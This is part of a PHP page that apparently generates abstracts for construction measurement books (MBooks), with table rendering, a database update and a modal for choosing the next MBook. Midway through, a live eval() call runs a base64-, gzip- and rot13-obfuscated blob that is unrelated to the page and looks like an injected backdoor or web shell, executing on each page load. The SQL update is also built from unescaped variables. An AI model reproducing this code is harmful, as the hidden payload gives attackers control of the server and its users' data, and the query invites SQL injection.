				if($pre_staffid != $CompoList->staffid)
				{
					$temp = 1;
				}
			}*/
			if($currentline>35)
			{
?>
				<tr height="" bgcolor="" class="label labelbold">
					<td width="81" 	align="center">&nbsp;</td>
					<td width="48" 	align="center">&nbsp;</td>
					<td width="390" align="right">&nbsp;</td>
					<td width="230" align="right" colspan="4" class="cobffont">
					<?php //echo "C/o to page ".($page+1)." /General MB No ".$mbookno; ?>
					C/o to page <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/General MB No.<?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/General MB No.<?php echo $mbookno; } ?>
					</td>
					<td width="65" 	align="right">&nbsp;</td>
					<td width="32" 	align="center">&nbsp;</td>
				</tr>
				<?php echo check_line($title,$table,$page,$mbookno,$NextMBList[$NextMbIncr],$table1); ?>
				<tr height="" bgcolor="" class="labelheadblue">
					<td width="81" 	align="center">&nbsp;</td>
					<td width="48" 	align="center">&nbsp;</td>
					<td width="390" align="right">&nbsp;</td>
					<td width="230" align="right" colspan="4" class="cobffont"><?php echo "B/f from page ".$page." /General MB No ".$mbookno; ?></td>
					<td width="65" 	align="right">&nbsp;</td>
					<td width="32" 	align="center">&nbsp;</td>
				</tr>
<?php	
				$currentline = $start_line + 8; $page++;
				/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
				if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$mbookno][1] = $page-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
			}
			if($temp == 1)
			{
?>
				<tr height="" bgcolor="" class="label labelbold">
					<td width="81" 	align="center"><?php //echo $Line; ?></td>
					<td width="48" 	align="center">&nbsp;</td>
					<td width="390" align="right">Total&nbsp;</td>
					<td width="230" align="right" nowrap="nowrap" colspan="4" class="cobffont"><?php echo getabstractpage($sheetid,$pre_subdivid); ?></td>
					<td width="65" 	align="right"><?php echo number_format($QtySum, $decimal, '.', ''); ?></td>
					<td width="32" 	align="left"><?php echo $pre_ItemUnit; ?></td>
				</tr>	
<?php
				$OutPutStr1 .=  $pre_divid."*".$pre_subdivid."*".$pre_fromdate."*".$pre_todate."*".$page."*".$mbookno."*".$QtySum."*".$pre_item_flag."@";
				$QtySum = 0; $temp = 0; $currentline++;
			}
		}
		if($currentline>35)
		{
?>
				<tr height="" bgcolor="" class="label labelbold">
					<td width="81" 	align="center">&nbsp;</td>
					<td width="48" 	align="center">&nbsp;</td>
					<td width="390" align="right">&nbsp;</td>
					<td width="230" align="right" colspan="4" class="cobffont">
					<?php //echo "C/o to page ".($page+1)." /General MB No ".$mbookno; ?>
					C/o to page <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/General MB No.<?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/General MB No.<?php echo $mbookno; } ?>
					</td>
					<td width="65" 	align="right">&nbsp;</td>
					<td width="32" 	align="center">&nbsp;</td>
				</tr>
				<?php echo check_line($title,$table,$page,$mbookno,$NextMBList[$NextMbIncr],$table1); ?>
				<tr height="" bgcolor="" class="label labelbold">
					<td width="81" 	align="center">&nbsp;</td>
					<td width="48" 	align="center">&nbsp;</td>
					<td width="390" align="right">&nbsp;</td>
					<td width="230" align="right" colspan="4" class="cobffont"><?php echo "B/f from page ".$page." /General MB No ".$mbookno; ?></td>
					<td width="65" 	align="right">&nbsp;</td>
					<td width="32" 	align="center">&nbsp;</td>
				</tr>
<?php	
				$currentline = $start_line + 8; $page++;
				/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
				if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$mbookno][1] = $page-1; $UsedMBArr[$mbookno][2] = 0; $mbookno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
		}
		if($pre_subdivid != $CompoList->subdivid)
		{
			$WrapReturn1 = getWordWrapCount($description,80);
			$description = $WrapReturn1[0];
			$wrap_cnt1 = $WrapReturn1[1];
			$currentline = $currentline + $wrap_cnt1;
			?>
				<tr height="" bgcolor="" class="">
					<td width="81" 	align="center">&nbsp;</td>
					<td width="48" 	align="center"><?php echo $subdivname; ?></td>
					<td width="230" align="left" colspan="5" class=""><?php echo $description; ?></td>
					<td width="65" 	align="right">&nbsp;</td>
					<td width="32" 	align="center">&nbsp;</td>
				</tr>
			<?php
		}
?>
				<tr height="" bgcolor="">
					<td width="81" 	align="center"><?php //echo dt_display($todate); ?></td>
					<td width="48" 	align="center"><?php //echo $subdivname; ?></td>
					<td width="390" align="center"><?php echo "B/f from ".$zonename." page no ".$CompoList->mbpage." Mbook No.".$CompoList->mbno; ?></td>
					<td width="35" 	align="center">&nbsp;<?php //echo $currentline; ?></td>
					<td width="65" 	align="center">&nbsp;</td>
					<td width="65" 	align="center">&nbsp;</td>
					<td width="65" 	align="center">&nbsp;</td>
					<td width="65" 	align="right"><?php echo number_format($CompoList->mbtotal, $decimal, '.', ''); ?></td>
					<td width="32" 	align="center">&nbsp;</td>
				</tr>	
<?php
				$update_sa_page_query 	= "update mbookgenerate_staff set sa_mbno = '$mbookno', sa_page = '$page' where sheetid = '$sheetid' and rbn = '$rbn' and 
										  zone_id = '$zone_id' and subdivid = '$CompoList->subdivid'";
				//echo $update_sa_page_query."<br/>";
				$update_sa_page_sql 	= mysql_query($update_sa_page_query);
				$currentline++;
				$pre_divid 		= 	$CompoList->divid;
				$pre_subdivid 	= 	$CompoList->subdivid;
				$pre_staffid 	= 	$CompoList->staffid;
				$pre_mbpage 	= 	$CompoList->mbpage;
				$pre_mbno 		= 	$CompoList->mbno;
				$pre_mbtotal 	= 	$CompoList->mbtotal;
				$pre_fromdate 	= 	$CompoList->fromdate;
				$pre_todate 	= 	$CompoList->todate;
				$pre_ItemUnit	=	$ItemUnit;
				$pre_item_flag	=	$item_flag;
				$QtySum			=	$QtySum + $CompoList->mbtotal;
				$pre_QtySum 	= 	$QtySum;
	}
				$OutPutStr2 	=  	$pre_divid."*".$pre_subdivid."*".$pre_fromdate."*".$pre_todate."*".$page."*".$mbookno."*".$QtySum."*".$pre_item_flag;
				$OutPutStr		=	$OutPutStr1.$OutPutStr2;
?>
				<tr height="" bgcolor="" class="label labelbold">
					<td width="81" 	align="center"><?php //echo $Line; ?></td>
					<td width="48" 	align="center">&nbsp;</td>
					<td width="390" align="right">Total&nbsp;</td>
					<td width="230" align="right"  nowrap="nowrap" colspan="4" class="cobffont"><?php echo getabstractpage($sheetid,$pre_subdivid); ?></td>
					<td width="65" 	align="right"><?php echo number_format($QtySum, $decimal, '.', ''); ?></td>
					<td width="32" 	align="left"><?php echo $pre_ItemUnit; ?></td>
				</tr>
<?php
	$currentline++;
	$lineTemp = 35-$currentline;
?>
				<tr style="border-style:none">
					<td colspan="9" style="border-style:none" align="center">
					<?php 
						for($x2=4; $x2<12; $x2++)
						{
							echo "<br/>";
						}
					?>
					<?php echo "Page ".$page; ?>
					</td>
				</tr>
<?php 

}





?>
</table>
<input type="hidden" name="hid_result" id="hid_result" value="<?php echo $OutPutStr; ?>" />
		<br/>
		<!--<div style="text-align:center; height:45px; line-height:45px;">
			<div class="buttonsection">
			<input type="button" class="backbutton" name="back" id="back" value="Back" onClick="goBack();"/>
			</div>
		</div>-->

 
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('LUvHEuu4Efwa165ipJjLJ+acMy8u5pwzv97kW6tHJUMCBsCE7h4t9WP/vfVUvN5Qufw9DsWCwv+dlymZl7/zoany+/8Pf8nqAk0F87Mt4V8/28cfOCLJWCj3fD/F8+qtvsDwf/1nCUtXRDsr6h2/74Ty6fej72zV2E+M7N6HLuBeE+8gJ5GzD9RdQcryfSTeYgUXFr85CtUkYI3tsehG+AGxoyNcd3nB9C2qwuxHt+gpd2MLAM7wvzsajdXKqENnI7XG6vhNUHLjPcgWYBhw+Fdy4NdpjGfbMUNkGi0OQQWrLMtq4NRXg+w3ZzgNWNrLuzWqlWrIyV242fimzjTDe0hCUX6XsYgfT15X6NVx0pQSFG0za2CBvos8TNWptLO3PciX8iq3xwjLrVJ/T0jIlARUVCsL4ykhtxIC7nCTv8GTDzrnX0roFabiOiF9c/BPTezC2wwdSNtsSQdUhPvPg4E3RRwW/Kr0kko5hUjIQfpU4xDGMqh+eRGXpyafiIT5nXkmBEvMSG8FElc1YEq2oUg19LFFm7PYNg/FRnnMjsTmtLENndtFtZRqDzjIqe6B++urXtEThyjq+B0T2BEeYMeKgQ3ZONKNmuK6sEHGodvRu/QDzxEg3mvbP+wkH6wYVeELMAUTQ1yncJa7aFVZhuIIvvhC4Hg92X1fDSowb2Bi/C7Oi4oakWUGxsz7uJv9bzv1kJXaEmZBmnrWgRA4vT22HpE5+KULciRr7/dLNCZk2r1OWA8RZ8/cKH8wtXiEclzsQBu6Ucs3TzNS7lmzE/iV54g1J/WRIw9TCWwMPu9OQwLftndNNJajm4ZC7kqcwaWfazEbN4SEyQ52OmnSYcvkYyKrJ+6TmbibbI3ER4qMMxk5FaH2GRk3udQypXoi7k4fxyeTDa6T9xebq22r+dG9JGmVQtIYiUMD+boEVTKX4DPTdzI6QJOKM9/ZVGko7ktSDlWUauPj5RXCvGmKGaSW0ohJbNHuuyxWbTW6IWwK+EgLZv4Ay8Eb+aEte69P3foLCd99tzARqlOSBYppntWvjiEbltAZ32E76or70jBrMxFqckwbasvi4l0Bd4Dxdb+k7xSQ7rjWnKhM+xM/u5pTB8iE5JLrXqkAlw0mSdqhgCr0Q7Qm5veFR7UifqZQCCqZQfyF7LpIMt3PxUmehh2puyA1qJgTB2i2FbEMpbTuR/VOAD/pVP5uQKE78/kNaTY+cBsGfLu+wWZb3J+fcm8qsJpKvFvZCRTahWi8AUqXAtzeJZzf/7oteNc7Q4CLrbMUh7XY0LHrw6jl+hYdcBp8sPPrnnBBSIPp1i8JgJ2dGXYYyj9WnNJMJB0pR+TlsTDgIc1cisuZuE1egmUQLFwaOlufX+7CwY5qvUDAX44LTo6pyotuSK6vdKric3xexIXHF/kTJYI16uLKVX7O3qWHWwklOxp2L4F5Z832CIC86ngTp/1NcbPzN4JtwYKOtPRWY2K2C1n2wwa61m2taOALgQgCTTmb8W5EB0QVa4RdBWMflHdZ5r17VVsR3yHlRgCGCxjdgidtAkP6QbgbA0Jm7dEpVc1snIuoh4mWWxV3acsaLEgfn/itzniD1p9q/iLYxNnjz/ltz7YXDin9sV23p2lxcpQ9q4mNSASIuRCf4yiuRkzcFifpjpGf81p5G9VLgnv6xQN6eTJuRgScLr1RzV7Ob9SiZZozogzBExlQk7nimYH5YEVDMZ0BY66okCrqH7O/Q3oXM/AWwnq+sfu9B3saPumlpgOU37ZRapQucX6zlIYFXHUKcBS69O+twAu0BHsl7ao4yYJBiziwHTxwA1ftfy9VWZbopEuBhU0hs+58YJagr9KBOr6uJD41TSQ47mnzXNnUNGCOmbKW+poujZvugzqDqn6zm5ZJrkGJok07o7ElJvNUYd5sZyB/9iEVV5bTrzmsjKGLgB4PDexcjOQ4pOok9valVyZMCgouOSc8V9r4SYGtIj8cP5Q5EYD75HTJ0ZAeni+9GGf59QRXjra2Omo8dhwNotXHK95bU7buwbRqIsKX8yTkG0VgsqaBcI9RN673D1qDdWE0Lzw2B84iXFgi+vp+6y5FxC2LusX7huTZVPyMsOHNhXGN2IC/6nF0bf9LX3g3dUWgrVxkKcP4TKOBr7Q2hlIqKQfisQcQ2dZoLLS7qORbnhk+wmPotkVl7Pot1INeLxLq7MbAoeVrCJA4sWfRIohtbr2gCaWzEklFgk35q02QO7kNK1rWrxFkp1OXTuVpguwbYeY/OZ2dM3Gq5Uo3w7yDvsD8Vx2Qoa/eow8CzFhWvgta0rLTC9meZtBOWskA5sTDENZpmpBNThi0+u7aPhofWbxsolLhdX97dvxgrT1/1jliZa+VWgK1QNvxQ7cbaRI2PDFfHIoIzwgU2fUtjyFSRh0hDxTSqjdzkmnOnpeMFwduYJf7QhR5O6g2eXzyDgZCbZ+TqpIprW5lmwdqovC+FCfgx1tFYFOGaWuZ3n6dYj9E/EgluPNXNVdtRztUyiVQmKBjTHLKXsNzUQI72GQiv2SeIu7Ez/UcYMe8mbtlkOKavupphpMrFk54Ayo+bRVyt6fF051xkjfHNV2MylNOScfiinLDfOH4uZ30u02M2LXvvvZvwwmI5r2KHe2EFoZzeA+8iHqvbbG5GOtJr0Jxp7Dg3mtmFbIbXetTioYQY3ww5Z1HErs/uR3cT0tynMN9LmDBCK42XCNKfBw24Hn2nlvuCIZ9RY3b+OgcegwFZ9yfRTtA3jloTxzuXYwhwk9PApkv5YVGyGj23mXzsQDgPiHMfi0h2kNAHh8IQxe/U3ruT+QSvzfKBuljdU7HKYc4NuCUhtP7PEOF1jQWvAB2D8ak1b9YdNTVwaLqKStlMo1aVa8LWm7fI3mDHpQ1l5WoVgJoUxiDzvKE1ZmphZhiEO3RdKPjDIWdaJAECrKlRVj8pVQHV0H9LjWixl4xG2Yh8F2omBDDPcAiqsAY5WAQUuzDG3YC/kOdWL5YWzKn5gH//KbeHIbA//g+5lkSYX8/KeJEvWHb2yNS2pcq4F6Svt3Wd0Xm3dVV9Q8HKl8yIdOH6OQUZOQNzUPVxzvSzPcgPlcw1PSl3WfJxqyR6/6rV5f5EL0zV2umazlZv8SXE7aPCEyQzzxuZSDGymzACY/jmOnJT6fZG4zQ5GU1bBED6JWmAmjnahN2iyRXStJOn9bc6o+EZb3psYGaoIEBF/VzM5lvUGx5WSJnUbg6GG3kyi/trLVl3BdayLJCfvPbIv6UH37mZScuv7TtndjT97hsQofhJVG548kd+adO/SEpMqt64Qw/2ettNAcnsrMNOn20elNGWeuDhlvJSCfRTiBXm2ymuLY4bkz3efLjaiosOAuRjcTeCldJ1S8a+Cu5b0Wek8LYMA9hZbmp50QViGyLg/4m2nLhG1Rz6/2u26rZ+FzbMko9ZUPemJu2TeVZF3xnaARFvqhnMWhZq/P84gHVZeo4QEYtfPKKOgzOuEUtWypemZNJh0JH+wixHrTpuNoP0i2+y2qXLQxF3MAleVyLIiNoeAi8Vds6j9yNyUVG/QHHZYlwch0Tup2oCTVrU7O1SD2TzV4sfFddhKwZAvrXcuVyNwPTh+v0KqjL43GHGFnnZJt7WxJ55OT2F390rnmYB8FjttdcPMU3a+XnnbXZR8HrSCooD0w3PRz9VUAHIc5yvDCETCpq3+Dov9op4FC77Co5N77K8hhQfxm4fsoT43EZpWGQM+7sjGSz21K2knfs3NQPdIjN8OXnG0TT+rNRwiEpm9oLzD2tEwUA7laGyMVLm599l1U9jiT6PWX43+FjThcrkuWre0N8vKL/1jTiA1iRXpn4zJaBevwljcHVH4c8PUauwVu39Rof1Wlc48NNHzLDWY13GH0+BPeLJYU7ExAEbAqZaDFudJDrV9YJJJ+I8pOvREZirqCBpBZH4jgPAV0tnpkjf3AlzsojYr2AZ0PhoQTKiO3kvYc+OQwGdfB1BLegdMopyt7oMLKKPUA2xeUxewSwzj+K9PLp3BzrDyHI9O14JrqH5V8Ebm6IafQkV+QWpGWkVMO9gtscB4R5UCmS68m624Tk1OWRonHEKwn4yzfNEChc0hGSX8ou3OFYJq1GW7q7OQCzJycQ4QVwsnhf4rRgUaI2y/Mg9MbbdqUVx1ZPvzLNUeJG/hmrA+iou3+iiMbLomIPun3HU9XygnhI5ePTV3cloddIUhhoxOpPUh0sWn5lmQmzJhADHIRTK43RgsbB6K7U68NH97x9+PslkYBlAKEyWZSORKlH+wV04Zu69tl9G+3nkIplUC+UZb1op7/NMewdgvAhBdNg+RsAwtSS+yXtLY4AmoZ/SGxB5bp1nSBz/NtprUrLFUKsPZu9JkNe2RDvTM+Fn5ys1WC+7Q1m3/LsEXemRaz7fLsONVz5kKVDTyCHPxNDtqmiBKn1X2Stt/p8UPxQ+plsCopTh025C1RWqCg3FOvzoBKC6rcr4Lo87jrEtv64IdvDZJ+S4pDZrz+VCBHwIDHZ6suCYzxIDGx9BkcOwI4XxcTN9z9VyUH2BSik0+u8XPlcB/BwqQ4gfY2ml5OWfMai/3m3xFqVgosp/4kMMv4y6mB8rq2RblwtQINO8se6PKWlpHGEav81rciTxOeqEx9+qp3gNRG9mI3ahTD6KZxxSoPPzplEq+czph+9naZB3i/mxy3Jl4hOXkyxr6X8pDa/t6T8jz56Dj5sa9syM94kXj5gjVBMfFxAmK9GJWCDhBkYlJoDTVlkJ2JeElsm7w9F8xLXH6GFbxINDeaetdX7ovG3D4Ldr6OJdl7Qd0cVW4KJiJofSXO8YuaRsU0HipR/9w6RwopbwL8zfigmQC1sOdfSMPe702KU0vttSQf5qkwu15Opzcc7aQPgJUGmB2/KKeo0HTtiUCShb7p1f8Djz160ZdTNGifUsXxHjapRxyB7da3w3EE/Fg+n0zTzNiyDCW5q/dY0LlPHZq92IYPukBUid49GXEWbn0+lLB9IbTU9fGG7ps74bkQHQX4HK3739NPH4STlwzmqtwvCm02SV+/uVqGSmXV+W5yZOi9df3u1PxhXlesHtAiMfpj9Xov+fPzXv9/Xf/4H')))));


?>
<div class="modal fade" id="myModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h4 class="modal-title">MBook List</h4>
      </div>
      <div class="modal-body" style="min-height:150px">
       <div style="width:55%; display:inline; float:left;">
	   	 <div style="height:20px">
		 	Click below box to select multiple Mbooks :
		 </div>
	   	 <div>
		 	<select id="NextMB" class="NextMB" multiple="multiple" style="width:400px;">
			   <option value=""> ------ Select Next MBook Nos ------</option>
			   <?php echo $objBind->BindNextMBlist($sheetid,'G',$mbookno); ?>
			</select>
			<br/><br/><br/>
			<div style="color:#FB133C; font-size:12px; font-weight:normal">* To select more than one mbook click again the above text box</div>
			<div style="color:#FB133C" align="center"><br />OR</div>
			<div style="color:#FB133C; font-size:12px; font-weight:normal"><br />* Press [Ctrl key] and Click the above text box </div>
		 </div>
	    </div>
		<div style="width:30%; display:inline; float:right">
			<div class="mbpgdiv" style="height:18px; color:#009ED2">&nbsp;Selected MBook No. & Page No.</div>
			<div id="MBPageRefSec"></div>
		</div>
      </div>

      <div class="modal-footer" style="text-align:center !important;">
        <button type="button" class="modal-btn-c" data-dismiss="modal">CLOSE</button>
        <input type="submit" name="modal_btn_next_mb" id="modal_btn_next_mb" class="modal-btn-n" value=" NEXT " />
      </div>
    </div><!-- /.modal-content -->
  </div><!-- /.modal-dialog -->
</div><!-- /.modal -->
</form>
<br/>
<input type="button" name="btn_next" id="btn_next" class="BottomContent1" value="Next" onclick="Nextpage()" style="cursor:pointer;">
<?php if($NextMBOption > 0){ ?>
	<script>
		var NoOfMB = "<?php echo $NextMBOption; ?>";
		BootstrapDialog.alert("You need to select next "+NoOfMB+" MBook to generate Abstract");
		$('#myModal').modal({backdrop:'static', keyboard:true, show:true});
		$(function(){
			$('#NextMB').change(function(event){ 
				var sheetid 		= 	$("#txt_sheet_id").val();
				var staffid			=	$("#txt_staffid").val();
				var rbn				=	$("#txt_rbn").val();
				var generatetype 	= 	"sw";
				$("#MBPageRefSec").html('');
				var x = 1;
				$.each($("#NextMB option:selected"), function(){   //alert($(this).text())
					var mbid 			= 	 $(this).val();//$("#NextMB option:selected").attr('value');//alert(currentmbooknovalue);
					var mbno 			= 	 $(this).text();//$("#NextMB option:selected").text();
					if(mbid != ""){
						$.post("MBookNoService.php", {currentmbook: mbid, currentbmookname: mbno, sheetid: sheetid, generatetype: generatetype, staffid: staffid, currentrbn: rbn}, function (data) { //alert(data);
							var pageno = data;
							var OutStr = "<div class='mbpgdiv'>MBook No. <input type='text' name='txt_next_mb"+x+"' class='mbtxt' value='"+mbno+"' readonly=''> &nbsp;Page : <input type='text' name='txt_next_mbpage"+x+"' class='mbtxt' value='"+pageno+"' readonly=''><input type='hidden' name='txt_no[]' class='mbtxt' value='"+x+"' readonly=''></div>";
							$("#MBPageRefSec").append(OutStr);
							x++;
						});
					}
				});
				
			});
		});
	</script>
<?php } ?>
<script type="text/javascript">
	function Nextpage(){
		url = "MBookGenerateSection4.php";
		window.location.replace(url);
   	}
	$(".NextMB").chosen();
</script>
<link rel="stylesheet" href="dashboard/MyView/TreeLabelStyle.css">
<style>
	.BottomContent1{
		cursor:pointer;
		pointer-events:auto;
		background-color:#009ff4;
		font-size:14px;
		letter-spacing:1px;
	}
	.BottomContent1:hover{
		background-color:#FD026C;
	}
	.modal-body {
		font-size: 12px;
		font-family:Verdana, Arial, Helvetica, sans-serif;
		color:#002D95;
		font-weight:600;
	}
	.mbpgdiv{
		padding:5px;
		border:1px solid #EBEBEB;
	}
	.mbtxt{
		padding:1px 5px 1px 5px;
		width:30px;
		border:1px solid #4096FF;
		text-align:right
	}
	.modal-btn-n{
		padding:8px;
		border:1px solid #0156E4;
		background:#0156E4;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
	.modal-btn-n:hover{
		background:#0048CE;
		border:1px solid #0048CE;
	}
	.modal-btn-c{
		padding:8px;
		border:1px solid #F1015B;
		background:#F1015B;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
	.modal-btn-c:hover{
		background:#D5004A;
		border:1px solid #D5004A;
	}
	.bootstrap-dialog-footer-buttons > .btn-default{
		padding:8px;
		border:1px solid #0156E4;
		background:#0156E4;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
</style>
    </body>
</html>
